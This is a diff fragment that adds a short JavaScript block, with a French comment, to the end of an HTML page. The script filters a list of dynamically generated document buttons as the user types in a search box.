+    document.addEventListener('DOMContentLoaded', function() {
+    const searchInput = document.getElementById('doc-search-input');
+    const docList = document.getElementById('doc-list');
+
+    if (searchInput) {
+        searchInput.addEventListener('input', function() {
+            const value = this.value.toLowerCase();
+            // Sélectionne les boutons à chaque frappe (car ils sont générés dynamiquement)
+            const items = docList.querySelectorAll('.doc-list-btn');
+            items.forEach(function(item) {
+                const txt = item.textContent.toLowerCase();
+                item.style.display = txt.includes(value) ? '' : 'none';
+            });
+        });
+    }
+});
+</script>
+</body>
+</html>
